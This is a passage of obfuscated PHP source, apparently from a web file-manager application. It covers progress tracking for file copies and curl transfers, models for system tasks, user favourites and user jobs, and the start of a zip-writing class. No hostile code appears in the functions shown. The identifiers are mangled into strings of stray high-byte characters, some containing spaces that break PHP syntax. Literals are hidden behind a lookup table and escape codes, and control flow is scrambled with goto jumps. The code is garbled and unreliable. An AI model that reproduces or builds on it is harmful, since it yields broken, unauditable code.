$_SERVER[£ü]; if (!$D©•ÈÕ¨ïà) { return; } $D­Ë¾âõ…¹ =& $this->task; goto aòì‡ğ®ºà; aÇˆæ¬Ûšù: if ($B«´ê²ºÚ°[$Eá•µ¿×²”[29]] == $Eá•µ¿×²”[164]) { $D­Ë¾âõ…¹[$Eá•µ¿×²”[966]] += 1; } else { $D­Ë¾âõ…¹[$Eá•µ¿×²”[966]] += $B«´ê²ºÚ°[$Eá•µ¿×²”[80]][$Eá•µ¿×²”[78]]; if ($B«´ê²ºÚ°[$Eá•µ¿×²”[366]]) { $D­Ë¾âõ…¹[$Eá•µ¿×²”[966]] += $B«´ê²ºÚ°[$Eá•µ¿×²”[80]][$Eá•µ¿×²”[79]] + 1; } } $D­Ë¾âõ…¹[$Eá•µ¿×²”[687]] += $B«´ê²ºÚ°[$Eá•µ¿×²”[77]]; $this->update(); goto D½§Èàó–; aòì‡ğ®ºà: $B«´ê²ºÚ° = IO::infoWithChildren($D©•ÈÕ¨ïà); $Ağï›•­ = $D­Ë¾âõ…¹[$Eá•µ¿×²”[1452]] ? $D­Ë¾âõ…¹[$Eá•µ¿×²”[1452]][$Eá•µ¿×²”[1453]] : 0; $D­Ë¾âõ…¹[$Eá•µ¿×²”[1452]] = array($Eá•µ¿×²”[1453] => $Ağï›•­ + 1, $Eá•µ¿×²”[383] => $B«´ê²ºÚ°[$Eá•µ¿×²”[28]], $Eá•µ¿×²”[75] => $B«´ê²ºÚ°[$Eá•µ¿×²”[75]], $Eá•µ¿×²”[462] => $B«´ê²ºÚ°[$Eá•µ¿×²”[462]] ? $B«´ê²ºÚ°[$Eá•µ¿×²”[462]] : $B«´ê²ºÚ°[$Eá•µ¿×²”[75]]); goto aÇˆæ¬Ûšù; D½§Èàó–: } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($a †Úã·±¯) { $a¸Úİòˆäñ =& $_SERVER[£ü]; $f†øâóßØø =& $this->task; $f†øâóßØø[$a¸Úİòˆäñ[1444]] = $a †Úã·±¯[$a¸Úİòˆäñ[28]]; $f†øâóßØø[$a¸Úİòˆäñ[968]] = $a †Úã·±¯[$a¸Úİòˆäñ[28]]; $this->update(); } public function copyFileStart($fËÙ¤ÀªÖ, $E·¢Ş‰‘êù, $dá’îßˆ¤¬, $CĞ«ÂğÙŞ, $EàŠè °„×, $f¨ÛÙë—ñÌ) { goto Fà¾òèß¤å; Fà¾òèß¤å: $D¥ÑªˆÍÂ =& $_SERVER[£ü]; $D—ˆ”±¸–– = $EàŠè °„×; if ($D—ˆ”±¸–– == $GLOBALS[$D¥ÑªˆÍÂ[1454]]) { $D—ˆ”±¸–– = $GLOBALS[$D¥ÑªˆÍÂ[1455]]; } goto D‰Ñßİ©‹î; Céî„ÚÚ¢: $Fæêä«‰ÛŠ[$D¥ÑªˆÍÂ[1444]] = $D—ˆ”±¸––; $Fæêä«‰ÛŠ[$D¥ÑªˆÍÂ[1446]] = (int) $fËÙ¤ÀªÖ->size($E·¢Ş‰‘êù); $Fæêä«‰ÛŠ[$D¥ÑªˆÍÂ[1447]] = 0; goto fä´ÄÖ… Ô; fä´ÄÖ… Ô: $Fæêä«‰ÛŠ[$D¥ÑªˆÍÂ[968]] = $D¥ÑªˆÍÂ[33]; $Fæêä«‰ÛŠ[$D¥ÑªˆÍÂ[1448]] = $D¥ÑªˆÍÂ[33]; $Fæêä«‰ÛŠ[$D¥ÑªˆÍÂ[1449]] = 0; goto E«ì–Û‚ã; D‰Ñßİ©‹î: $GLOBALS[$D¥ÑªˆÍÂ[1455]] = $EàŠè °„×; $GLOBALS[$D¥ÑªˆÍÂ[1454]] = $f¨ÛÙë—ñÌ; $Fæêä«‰ÛŠ =& $this->task; goto Céî„ÚÚ¢; E«ì–Û‚ã: $this->update(); goto c‚òŸ™…Ğ; c‚òŸ™…Ğ: } public function copyFileEnd($bÖ¶’ª‹Î, $E¾˜÷ÂòŠá, $f÷Ì»×ƒŠ, $D„ñÀÚÖê, $AŞìË÷Ëİ, $A¬ÖƒŞ™‡ï) { $D§Â“íåº¨ =& $_SERVER[£ü]; $C¦ÙµäÄİ =& $this->task; $C¦ÙµäÄİ[$D§Â“íåº¨[1447]] = $C¦ÙµäÄİ[$D§Â“íåº¨[1446]]; $C¦ÙµäÄİ[$D§Â“íåº¨[1448]] = $D§Â“íåº¨[33]; if ($AŞìË÷Ëİ == $C¦ÙµäÄİ[$D§Â“íåº¨[1444]]) { $C¦ÙµäÄİ[$D§Â“íåº¨[1451]] += $C¦ÙµäÄİ[$D§Â“íåº¨[1446]]; $this->update(1); } else { $this->update(); $C¦ÙµäÄİ[$D§Â“íåº¨[1447]] = 0; } self::log($D§Â“íåº¨[1456] . $E¾˜÷ÂòŠá . $D§Â“íåº¨[66] . $D„ñÀÚÖê . $D§Â“íåº¨[214] . $AŞìË÷Ëİ . $D§Â“íåº¨[1457] . $C¦ÙµäÄİ[$D§Â“íåº¨[1444]]); } public function updateFileEnd($a¹–Ï•Ä, $E›‹×Íé) { $aŸÌ¡Ö“ğ =& $_SERVER[£ü]; $bÆ–æ¤ó¡ó =& $this->task; $bÆ–æ¤ó¡ó[$aŸÌ¡Ö“ğ[1444]] = $a¹–Ï•Ä; $bÆ–æ¤ó¡ó[$aŸÌ¡Ö“ğ[1446]] = $E›‹×Íé; $bÆ–æ¤ó¡ó[$aŸÌ¡Ö“ğ[1451]] += $E›‹×Íé; $this->update(1); } public function sourceModelCopy($Cé˜Æ‚Œè…) { goto dŸ‰—¾‘´; Bœ‹Šñƒ‹¶: switch ($e»˜ØƒœÅ) { case $a¬ÉµŠ£ñ×[503]: $fì¿¤‡­ƒ³ = 1; break; case $a¬ÉµŠ£ñ×[506]: $d‡§ÌÊÛ[$a¬ÉµŠ£ñ×[1444]] = $BÉÑâí°ãù[$a¬ÉµŠ£ñ×[28]]; break; case $a¬ÉµŠ£ñ×[508]: $fì¿¤‡­ƒ³ = intval($Cé˜Æ‚Œè…[$a¬ÉµŠ£ñ×[360]] * 0.4); break; case $a¬ÉµŠ£ñ×[510]: $fì¿¤‡­ƒ³ = intval($Cé˜Æ‚Œè…[$a¬ÉµŠ£ñ×[360]] * 0.2); break; case $a¬ÉµŠ£ñ×[512]: $fì¿¤‡­ƒ³ = intval($Cé˜Æ‚Œè…[$a¬ÉµŠ£ñ×[360]] * 0.4); break; } $this->update($fì¿¤‡­ƒ³); $this->sourceModelCopyFlag = !1; goto D÷ê¿Â·¼—; dÅ…ğ‚¶Í: $d‡§ÌÊÛ =& $this->task; $this->sourceModelCopyFlag = !0; $fì¿¤‡­ƒ³ = 0; goto Bœ‹Šñƒ‹¶; dŸ‰—¾‘´: $a¬ÉµŠ£ñ× =& $_SERVER[£ü]; $e»˜ØƒœÅ = $Cé˜Æ‚Œè…[0]; $BÉÑâí°ãù = $Cé˜Æ‚Œè…[1]; goto dÅ…ğ‚¶Í; D÷ê¿Â·¼—: } public function sourceRemove($f££ˆ”÷ª, $a³ã•Ø²ù°) { $EÃ¯ÑÇÉäÙ =& $_SERVER[£ü]; $this->sourceModelCopyFlag = !0; $A›áæ‹Ô¡‰ = 1; if (isset($f££ˆ”÷ª[$EÃ¯ÑÇÉäÙ[80]])) { $A›áæ‹Ô¡‰ = $f££ˆ”÷ª[$EÃ¯ÑÇÉäÙ[80]][$EÃ¯ÑÇÉäÙ[78]] + $f££ˆ”÷ª[$EÃ¯ÑÇÉäÙ[80]][$EÃ¯ÑÇÉäÙ[79]] + 1; } $this->update($A›áæ‹Ô¡‰); $this->sourceModelCopyFlag = !1; } public function sourceMove($cºŸğ¢º¿¡) { $this->sourceRemove($cºŸğ¢º¿¡, !1); } public function curlProgress($E¿Ÿ—ÊÌï…, $FƒìÖàÎç, $Aæï”Ç‡ùŞ, $dâ³‡²ƒ, $aÓ±ñÒù¾) { $e‘ÃíæÔÑ =& $_SERVER[£ü]; $CèÖòâ¨± =& $this->task; if ($aÓ±ñÒù¾ > 0) { $CèÖòâ¨±[$e‘ÃíæÔÑ[968]] = $e‘ÃíæÔÑ[1458]; $CèÖòâ¨±[$e‘ÃíæÔÑ[1448]] = $e‘ÃíæÔÑ[91]; if ($CèÖòâ¨±[$e‘ÃíæÔÑ[1446]] == $dâ³‡²ƒ || $dâ³‡²ƒ > 1024 * 1024) { $CèÖòâ¨±[$e‘ÃíæÔÑ[1447]] = $aÓ±ñÒù¾; } if ($CèÖòâ¨±[$e‘ÃíæÔÑ[1449]]) { $CèÖòâ¨±[$e‘ÃíæÔÑ[1447]] = $aÓ±ñÒù¾ + $CèÖòâ¨±[$e‘ÃíæÔÑ[1449]]; } } else { if ($Aæï”Ç‡ùŞ > 0) { if ($CèÖòâ¨±[$e‘ÃíæÔÑ[1446]] == $FƒìÖàÎç) { $CèÖòâ¨±[$e‘ÃíæÔÑ[1447]] = $Aæï”Ç‡ùŞ; $CèÖòâ¨±[$e‘ÃíæÔÑ[968]] = $e‘ÃíæÔÑ[1459]; $CèÖòâ¨±[$e‘ÃíæÔÑ[1448]] = $e‘ÃíæÔÑ[1030]; } } } $this->update(); } public function curlProgressStart($d´ğË‚Ó®) { } public function curlProgressEnd($Açİ¼Ä³ß…) { $AÉíŸãÒó„ =& $_SERVER[£ü]; $cÎƒ¾œŠ¯ç =& $this->task; $C¶ôîåøÒÊ = curl_getinfo($Açİ¼Ä³ß…); $eÛ³ºÅñ« = $C¶ôîåøÒÊ[$AÉíŸãÒó„[1460]]; if ($cÎƒ¾œŠ¯ç[$AÉíŸãÒó„[1448]] == $AÉíŸãÒó„[91] && $eÛ³ºÅñ«) { $cÎƒ¾œŠ¯ç[$AÉíŸãÒó„[1449]] += $eÛ³ºÅñ«; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $c•…«‘² × =& $_SERVER[£ü]; Hook::bind($c•…«‘² ×[1438], array($this, $c•…«‘² ×[1461])); Hook::bind($c•…«‘² ×[1440], array($this, $c•…«‘² ×[1462])); Hook::bind($c•…«‘² ×[1442], array($this, $c•…«‘² ×[1463])); } protected function endAfter() { $fº‰ºØ®× =& $_SERVER[£ü]; Hook::unbind($fº‰ºØ®×[1438], array($this, $fº‰ºØ®×[1461])); Hook::unbind($fº‰ºØ®×[1440], array($this, $fº‰ºØ®×[1462])); Hook::unbind($fº‰ºØ®×[1442], array($this, $fº‰ºØ®×[1463])); } public function progressStart($Fœì“Ö¸«—) { $D¥ğ‰‘Ñ =& $_SERVER[£ü]; $aÏ¾ßîÌé® = curl_getinfo($Fœì“Ö¸«—); self::log($D¥ğ‰‘Ñ[1464] . $aÏ¾ßîÌé®[$D¥ğ‰‘Ñ[292]]); self::valueSet($this->task[$D¥ğ‰‘Ñ[364]], $this->task); } public function progressEnd($A¦ø¿º“Ë) { $D¥±ö’Éí• =& $_SERVER[£ü]; self::log($D¥±ö’Éí•[1465] . $this->task[$D¥±ö’Éí•[364]]); $this->end(); } public function progress($a§È¦ Š®¾, $Câ´ó·Æ‹, $Bç–˜´‘“ì, $Cè›œÙô‡¸, $bïÅ¼Ú‡ß÷) { $d–äËê‚—  =& $_SERVER[£ü]; $b’ÁÊ÷ŠÓ =& $this->task; if ($bïÅ¼Ú‡ß÷ > 0) { $b’ÁÊ÷ŠÓ[$d–äËê‚— [966]] = $b’ÁÊ÷ŠÓ[$d–äËê‚— [966]] == 0 ? $Cè›œÙô‡¸ : $b’ÁÊ÷ŠÓ[$d–äËê‚— [966]]; $b’ÁÊ÷ŠÓ[$d–äËê‚— [978]] = $bïÅ¼Ú‡ß÷; } else { if ($Bç–˜´‘“ì > 0) { $b’ÁÊ÷ŠÓ[$d–äËê‚— [966]] = $b’ÁÊ÷ŠÓ[$d–äËê‚— [966]] == 0 ? $Câ´ó·Æ‹ : $b’ÁÊ÷ŠÓ[$d–äËê‚— [966]]; $b’ÁÊ÷ŠÓ[$d–äËê‚— [978]] = $Bç–˜´‘“ì; } } $this->update(); self::log("\x70\162\157\147\162\x65\163\x73\x48\x74\x74\x70\x3a\144\157\167\156\72{$Bç–˜´‘“ì}\57{$Câ´ó·Æ‹}\x3b\40\x75\160\154\x6f\141\x64\x3a{$bïÅ¼Ú‡ß÷}\x2f{$Cè›œÙô‡¸}\73"); } } goto f¸ˆ…±‹â¬; Eµö­ÍƒÂ: class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\x65\x6d\x2e\x74\x61\163\x6b\x4c\151\x73\x74"; public $field = array("\156\141\x6d\x65", "\x74\x79\x70\x65", "\x65\x76\x65\x6e\164", "\x74\x69\x6d\145", "\144\x65\163\x63", "\163\171\x73\x74\x65\x6d", "\145\156\x61\x62\154\145", "\x6c\x61\163\x74\x52\x75\156", "\x73\x6f\162\x74"); public function listData($E”‘ÑŠ± = false, $aÍŞˆÄÚ ® = "\163\157\x72\x74", $c»âéÛÈÆ = false) { return parent::listData($E”‘ÑŠ±, $aÍŞˆÄÚ ®, $c»âéÛÈÆ); } public function add($F¶Éµ¼ÈÙé) { $B¨†ùï¼áø =& $_SERVER[£ü]; $b„¾Œ«„‰ = $this->findByName($F¶Éµ¼ÈÙé[$B¨†ùï¼áø[28]]); if ($b„¾Œ«„‰) { return !1; } $F¶Éµ¼ÈÙé[$B¨†ùï¼áø[1366]] = 0; $F¶Éµ¼ÈÙé[$B¨†ùï¼áø[2085]] = $this->getSort(); return parent::insert($F¶Éµ¼ÈÙé); } private function getSort() { $a°ŠÑÕø± =& $_SERVER[£ü]; $e‰»¿¡Œ£¸ = parent::listData(); $d°ÊÅİÁ¢· = array_to_keyvalue($e‰»¿¡Œ£¸, $a°ŠÑÕø±[33], $a°ŠÑÕø±[2085]); return empty($d°ÊÅİÁ¢·) ? 0 : max($d°ÊÅİÁ¢·) + 1; } public function update($e£øó›…ñ, $eÅÁÃ…À“ì) { $E¬†Õ‡‚ô =& $_SERVER[£ü]; $AØ”µ×“è = $this->listData($e£øó›…ñ); $FŸ†ğßŠ¯ = $this->findByName($eÅÁÃ…À“ì[$E¬†Õ‡‚ô[28]]); if (!$AØ”µ×“è || $FŸ†ğßŠ¯ && $FŸ†ğßŠ¯[$E¬†Õ‡‚ô[364]] != $AØ”µ×“è[$E¬†Õ‡‚ô[364]]) { return !1; } return parent::update($e£øó›…ñ, $eÅÁÃ…À“ì); } public function remove($e±Ô§êÖ¦ô, $fÃ‘âŠ®á = false) { $d½¦¡šïƒö =& $_SERVER[£ü]; $Fõ¬îÉÜßŠ = $this->listData($e±Ô§êÖ¦ô); if (!$Fõ¬îÉÜßŠ) { return; } if (!$fÃ‘âŠ®á && $Fõ¬îÉÜßŠ[$d½¦¡šïƒö[1070]] == $d½¦¡šïƒö[83]) { return !1; } return parent::remove($e±Ô§êÖ¦ô); } public function enable($b©™©™æá, $E½§…î¤Ï­) { return $this->update($b©™©™æá, array($_SERVER[£ü][2426] => $E½§…î¤Ï­)); } public function run($fÍè‡ƒ„í) { return $this->update($fÍè‡ƒ„í, array($_SERVER[£ü][2436] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\165\x73\145\162\x5f\146\141\x76"; protected function cacheFunctionAlias($eÎãÁŒè¼å) { $cí©±ö„…ë =& $_SERVER[£ü]; return array($cí©±ö„…ë[2437] => array(USER_ID, $cí©±ö„…ë[2438])); } protected function listData() { $c»·ÜŒì“ =& $_SERVER[£ü]; $F»Ş¬ğñŸÂ = array($c»·ÜŒì“[1392] => USER_ID, $c»·ÜŒì“[432] => 0); $C¯ä®î¸ = $c»·ÜŒì“[2439]; $A§ß›ÛÆ©ğ = $this->field($C¯ä®î¸)->where($F»Ş¬ğñŸÂ)->order($c»·ÜŒì“[2440])->select(); return $A§ß›ÛÆ©ğ ? $A§ß›ÛÆ©ğ : array(); } protected function resetCache() { } protected function listView() { goto F×…®ÊîÃÜ; F×…®ÊîÃÜ: $eÈµÆ‘è³Ù =& $_SERVER[£ü]; $F÷ğ«Á¢çÇ = $this->listData(); $a×ƒ•·Ä” = array_filter_by_field($F÷ğ«Á¢çÇ, $eÈµÆ‘è³Ù[29], $eÈµÆ‘è³Ù[379]); goto Cï Ğãï™‚; Cï Ğãï™‚: $A–ğ¯ìÀ’— = array_to_keyvalue($a×ƒ•·Ä”, $eÈµÆ‘è³Ù[33], $eÈµÆ‘è³Ù[75]); if (!$A–ğ¯ìÀ’—) { return $F÷ğ«Á¢çÇ; } $BÊŸ¼ÚÓ¼Â = 2000; goto dŸš“ÒÕæ; dŸš“ÒÕæ: $E‹…Äìª¬ä = array($eÈµÆ‘è³Ù[380] => array($eÈµÆ‘è³Ù[381], $A–ğ¯ìÀ’—)); $b”Ôˆô¦Ú‹ = Model($eÈµÆ‘è³Ù[748])->listSource($E‹…Äìª¬ä, $BÊŸ¼ÚÓ¼Â); $b”Ôˆô¦Ú‹ = array_merge($b”Ôˆô¦Ú‹[$eÈµÆ‘è³Ù[73]], $b”Ôˆô¦Ú‹[$eÈµÆ‘è³Ù[74]]); goto dŒ²›åÄ•; dŒ²›åÄ•: $b”Ôˆô¦Ú‹ = array_to_keyvalue($b”Ôˆô¦Ú‹, $eÈµÆ‘è³Ù[366]); foreach ($F÷ğ«Á¢çÇ as $a‘©œä‘Ùë => $dÛ†èç„ë) { $BÍŞğ‚Şæ = $b”Ôˆô¦Ú‹[$dÛ†èç„ë[$eÈµÆ‘è³Ù[75]]]; $BÍŞğ‚Şæ = $BÍŞğ‚Şæ ? $BÍŞğ‚Şæ : array(); $F÷ğ«Á¢çÇ[$a‘©œä‘Ùë] = array_merge($BÍŞğ‚Şæ, $dÛ†èç„ë); } return $F÷ğ«Á¢çÇ; goto c„Çë°„—; c„Çë°„—: } protected function addFav($cØ¬é»†, $CšÅä“Ë– = '', $Fø ÄÆö‰² = "\163\157\x75\162\x63\x65") { goto c¯å¶ó‘; dƒÛ¶Í‹Åã: return $this->add($A –òÊ¦¸§); goto c‡ƒÀ¼¡²; c¯å¶ó‘: $Fä¸èİ˜Äõ =& $_SERVER[£ü]; $Aİ‚¬×¥î§ = array($Fä¸èİ˜Äõ[1392] => USER_ID, $Fä¸èİ˜Äõ[432] => 0, $Fä¸èİ˜Äõ[385] => $Fø ÄÆö‰², $Fä¸èİ˜Äõ[384] => $cØ¬é»†); if ($this->where($Aİ‚¬×¥î§)->find()) { return !1; } goto d¶Ê‘ß¼‡; d¶Ê‘ß¼‡: $Aİ‚¬×¥î§ = array($Fä¸èİ˜Äõ[1392] => USER_ID, $Fä¸èİ˜Äõ[432] => 0); $b¼©×¹µ‡ˆ = $this->where($Aİ‚¬×¥î§)->max($Fä¸èİ˜Äõ[2085]); if (!$b¼©×¹µ‡ˆ) { $b¼©×¹µ‡ˆ = 0; } goto b¾Áìù²ÊÎ; b¾Áìù²ÊÎ: if (!$CšÅä“Ë– && $Fø ÄÆö‰² == $Fä¸èİ˜Äõ[379]) { $EñÄß´á–É = Model($Fä¸èİ˜Äõ[1100])->where(array($Fä¸èİ˜Äõ[380] => $cØ¬é»†))->find(); if (!$EñÄß´á–É) { return !1; } $CšÅä“Ë– = $EñÄß´á–É[$Fä¸èİ˜Äõ[28]]; } $CšÅä“Ë– = $this->getAutoName($CšÅä“Ë–); $A –òÊ¦¸§ = array($Fä¸èİ˜Äõ[1392] => USER_ID, $Fä¸èİ˜Äõ[432] => 0, $Fä¸èİ˜Äõ[383] => $CšÅä“Ë–, $Fä¸èİ˜Äõ[384] => $cØ¬é»†, $Fä¸èİ˜Äõ[385] => $Fø ÄÆö‰², $Fä¸èİ˜Äõ[2068] => $b¼©×¹µ‡ˆ + 1); goto dƒÛ¶Í‹Åã; c‡ƒÀ¼¡²: } protected function remove($cñæ•‚ò°Î) { $eÑ„öğšºï =& $_SERVER[£ü]; $FÙÜ„ÚÜªÔ = array($eÑ„öğšºï[1392] => USER_ID, $eÑ„öğšºï[382] => $cñæ•‚ò°Î); return $this->where($FÙÜ„ÚÜªÔ)->delete(); } protected function removeByName($FÊ™ìØ–) { $c‘—Š‡¾›ë =& $_SERVER[£ü]; $bÚšÊ©¡ = array($c‘—Š‡¾›ë[1392] => USER_ID, $c‘—Š‡¾›ë[383] => $FÊ™ìØ–, $c‘—Š‡¾›ë[432] => 0); return $this->where($bÚšÊ©¡)->delete(); } protected function rename($Fè’…ÅŠ, $Cîó‹®æä) { $b’ñ×ÎŞ×¹ =& $_SERVER[£ü]; if ($Fè’…ÅŠ == $Cîó‹®æä) { return !1; } $F¾†â…·¢ = $this->getAutoName($Cîó‹®æä); if ($Cîó‹®æä != $F¾†â…·¢) { return !1; } $C’ÙÖœÇ¸» = array($b’ñ×ÎŞ×¹[1392] => USER_ID, $b’ñ×ÎŞ×¹[432] => 0, $b’ñ×ÎŞ×¹[28] => $Fè’…ÅŠ); return $this->where($C’ÙÖœÇ¸»)->save(array($b’ñ×ÎŞ×¹[28] => $Cîó‹®æä)); } protected function resetSort($eÙßéÂèôÖ) { $bø¼İŸÅ”¬ =& $_SERVER[£ü]; $eÙßéÂèôÖ = is_array($eÙßéÂèôÖ) ? $eÙßéÂèôÖ : array(); $FØ¡—èÑá… = array($bø¼İŸÅ”¬[1392] => USER_ID); for ($Dº½åö³ˆ = 0; $Dº½åö³ˆ < count($eÙßéÂèôÖ); $Dº½åö³ˆ++) { $FØ¡—èÑá…[$bø¼İŸÅ”¬[382]] = $eÙßéÂèôÖ[$Dº½åö³ˆ]; $this->where($FØ¡—èÑá…)->save(array($bø¼İŸÅ”¬[2068] => $Dº½åö³ˆ + 1)); } return !0; } protected function moveTop($BªÃ¶¶ÀŠ) { goto FÌôœö«†Ì; FÌôœö«†Ì: $Fô›“Áš— =& $_SERVER[£ü]; $d¹“¹½¢ = array($Fô›“Áš—[1392] => USER_ID, $Fô›“Áš—[432] => 0); $F‡œ®Š³Èí = $this->where($d¹“¹½¢)->where(array($Fô›“Áš—[28] => $BªÃ¶¶ÀŠ))->find(); goto A¨Ë¼›°¯†; dÉì‰§“šù: return $this->resetSort($Eì‚•˜—¸¦); goto e¬¥Ì¨Å¢˜; A¨Ë¼›°¯†: if (!$F‡œ®Š³Èí) { return; } $Eì‚•˜—¸¦ = $this->field($Fô›“Áš—[364])->where($d¹“¹½¢)->order($Fô›“Áš—[2440])->select(); $Eì‚•˜—¸¦ = array_to_keyvalue($Eì‚•˜—¸¦, $Fô›“Áš—[33], $Fô›“Áš—[364]); goto fƒ—•ëÜ“; fƒ—•ëÜ“: $A‘‹¯Î‘Á = $Eì‚•˜—¸¦; $Eì‚•˜—¸¦ = array_remove_value($Eì‚•˜—¸¦, $F‡œ®Š³Èí[$Fô›“Áš—[364]]); array_unshift($Eì‚•˜—¸¦, $F‡œ®Š³Èí[$Fô›“Áš—[364]]); goto dÉì‰§“šù; e¬¥Ì¨Å¢˜: } protected function moveBottom($A±÷ÈåĞ ´) { $eÛ¹ĞÛµË =& $_SERVER[£ü]; $Eé²–º£¨¸ = array($eÛ¹ĞÛµË[1392] => USER_ID, $eÛ¹ĞÛµË[432] => 0); $b¥àà¹¥Å÷ = $this->where($Eé²–º£¨¸)->max($eÛ¹ĞÛµË[2085]); $EÏå¶ÍêßÉ = array($eÛ¹ĞÛµË[2085] => $b¥àà¹¥Å÷ + 1); return $this->where($Eé²–º£¨¸)->where(array($eÛ¹ĞÛµË[28] => $A±÷ÈåĞ ´))->save($EÏå¶ÍêßÉ); } private function getAutoName($F¢µ¦È›¥…) { goto fØ–Áêàîœ; E¿®œÂÄöÄ: $CƒÀÕÙçÚ = array_to_keyvalue($CƒÀÕÙçÚ, $b‰á ™õ”ê[33], $b‰á ™õ”ê[28]); if (!$CƒÀÕÙçÚ || !in_array($F¢µ¦È›¥…, $CƒÀÕÙçÚ)) { return $F¢µ¦È›¥…; } for ($eŒ‰Õñ‡¤ = 0; $eŒ‰Õñ‡¤ < count($CƒÀÕÙçÚ); $eŒ‰Õñ‡¤++) { if (!in_array($F¢µ¦È›¥… . "\x28{$eŒ‰Õñ‡¤}\x29", $CƒÀÕÙçÚ)) { return $F¢µ¦È›¥… . "\50{$eŒ‰Õñ‡¤}\x29"; } } goto bØ‡Æ—‡“É; bØ‡Æ—‡“É: return $F¢µ¦È›¥… . "\x28{$eŒ‰Õñ‡¤}\x29"; goto fÏÁÈ¥«‡ß; fØ–Áêàîœ: $b‰á ™õ”ê =& $_SERVER[£ü]; $C¸Ò ¢Ø§Ñ = array($b‰á ™õ”ê[1392] => USER_ID, $b‰á ™õ”ê[432] => 0); $CƒÀÕÙçÚ = $this->field($b‰á ™õ”ê[28])->where($C¸Ò ¢Ø§Ñ)->select(); goto E¿®œÂÄöÄ; fÏÁÈ¥«‡ß: } } class UserJobModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\x65\155\x2e\x6a\157\x62\114\151\163\x74"; public $field = array("\156\141\155\145", "\144\x65\x73\143", "\163\x6f\x72\164"); const JOB_KEY = "\163\145\154\x66\x4a\x6f\142\114\151\x73\164"; public function listData($EÑÖ¨ãÍçœ = false, $BïÅÖã‚—‰ = "\163\157\162\x74", $A“Æô§ğ¨¬ = false) { return parent::listData($EÑÖ¨ãÍçœ, $BïÅÖã‚—‰, $A“Æô§ğ¨¬); } public function remove($Cğ²Ğ£†Ø) { return parent::remove($Cğ²Ğ£†Ø); } public function add($f¦à·“˜ë) { $D‘Ğº•Âš =& $_SERVER[£ü]; if ($this->findByName($f¦à·“˜ë[$D‘Ğº•Âš[28]])) { return !1; } $f¦à·“˜ë[$D‘Ğº•Âš[2085]] = $this->getSort(); return parent::insert($f¦à·“˜ë); } private function getSort() { $dª¡šÏ†„î =& $_SERVER[£ü]; $B¯øÎíš = parent::listData(); $C„ïµóêã„ = array_to_keyvalue($B¯øÎíš, $dª¡šÏ†„î[33], $dª¡šÏ†„î[2085]); return empty($C„ïµóêã„) ? 0 : max($C„ïµóêã„) + 1; } public function update($dÉÅæªªä, $A”ÓÑñ†Ö„) { $AÛ‘ó‡œº– =& $_SERVER[£ü]; $CŠ³¼öŞŸ = parent::listData($dÉÅæªªä); $a÷±äÓ„Ìè = $this->findByName($A”ÓÑñ†Ö„[$AÛ‘ó‡œº–[28]]); if (!$CŠ³¼öŞŸ || $a÷±äÓ„Ìè && $a÷±äÓ„Ìè[$AÛ‘ó‡œº–[364]] != $CŠ³¼öŞŸ[$AÛ‘ó‡œº–[364]]) { return !1; } return parent::update($dÉÅæªªä, $A”ÓÑñ†Ö„); } public function setUserJob($A‚˜ÀÍÒ³, $C¼…ÍøË‡») { goto dŸ—‹ù¡¬È; FõÒŞçŠÄ: $c³Ÿ„Ä‚Ç” = array_to_keyvalue($BÁ§¿ªº…ç, $b­§„Ê£„¦[28]); $B©Öô‘—Æê = $b­§„Ê£„¦[358]; foreach ($C¼…ÍøË‡» as $Aéñ®–²×Ø) { if ($c³Ÿ„Ä‚Ç”[$Aéñ®–²×Ø]) { $B©Öô‘—Æê .= $c³Ÿ„Ä‚Ç”[$Aéñ®–²×Ø][$b­§„Ê£„¦[364]] . $b­§„Ê£„¦[47]; } else { $Aİîµºßğ» = $this->add($Aéñ®–²×Ø); $B©Öô‘—Æê .= $Aİîµºßğ» . $b­§„Ê£„¦[47]; } } goto b²•Ô±˜¸÷; b²•Ô±˜¸÷: $B©Öô‘—Æê = rtrim($B©Öô‘—Æê, $b­§„Ê£„¦[47]); Model($b­§„Ê£„¦[473])->metaSet($A‚˜ÀÍÒ³, self::JOB_KEY, $B©Öô‘—Æê); goto bÑ§ù‚Ù˜â; dŸ—‹ù¡¬È: $b­§„Ê£„¦ =& $_SERVER[£ü]; if (!is_array($C¼…ÍøË‡»)) { $C¼…ÍøË‡» = array($C¼…ÍøË‡»); } $BÁ§¿ªº…ç = parent::listData(); goto FõÒŞçŠÄ; bÑ§ù‚Ù˜â: } public function getUserJob($fßÓ”âÑä) { $EÁÁ‘¿¨ƒƒ = Model($_SERVER[£ü][473])->metaGet($fßÓ”âÑä); return $this->getUserJobInfo($EÁÁ‘¿¨ƒƒ[self::JOB_KEY]); } public function getUserJobInfo($Bİ‚œŞª³ö) { goto d  ™ã³ÈË; d•…”İš•Ë: $eİ•¸¢ÈßÅ = array_remove_key($eİ•¸¢ÈßÅ, $cëâ¨Ç°“½[184]); $c×‘Àæ”¨ = array(); foreach ($dëã¬‰È‹Â as $eœ·ÃÌµ) { if (isset($eİ•¸¢ÈßÅ[$eœ·ÃÌµ])) { $c×‘Àæ”¨[] = $eİ•¸¢ÈßÅ[$eœ·ÃÌµ]; } } goto c„‰›„œƒœ; d  ™ã³ÈË: $cëâ¨Ç°“½ =& $_SERVER[£ü]; $dëã¬‰È‹Â = explode($cëâ¨Ç°“½[47], $Bİ‚œŞª³ö); $eİ•¸¢ÈßÅ = parent::listData(); goto d•…”İš•Ë; c„‰›„œƒœ: return $c×‘Àæ”¨; goto d³¿íáõ©ğ; d³¿íáõ©ğ: } } goto DÀƒ‚ŒÇ‘; B£Ø½öÁšõ: class ZipMake { const VERSION = "\x30\x2e\62\x2e\x30"; const ZIP_VERSION = 10; const ZIP_VERSION_64 = 45; const METHOD_STORE = 0; const FILE_HEADER_SIGNATURE = 67324752; const CDR_FILE_SIGNATURE = 33639248; const CDR_EOF_SIGNATURE = 101010256; const DATA_DESCRIPTOR_SIGNATURE = 134695760; const ZIP64_CDR_EOF_SIGNATURE = 101075792; const ZIP64_CDR_LOCATOR_SIGNATURE = 117853008; public $files = array(); public $cdrOffset = 0; public $ofs = 0; protected $needHeaders; protected $outputName; public function __construct($cõ¾¬ÁÖæ· = null) { $A®†ºÇÊóÏ =& $_SERVER[£ü]; $this->outputStream = fopen($A®†ºÇÊóÏ[1969], $A®†ºÇÊóÏ[1208]); $this->outputName = $cõ¾¬ÁÖæ·; 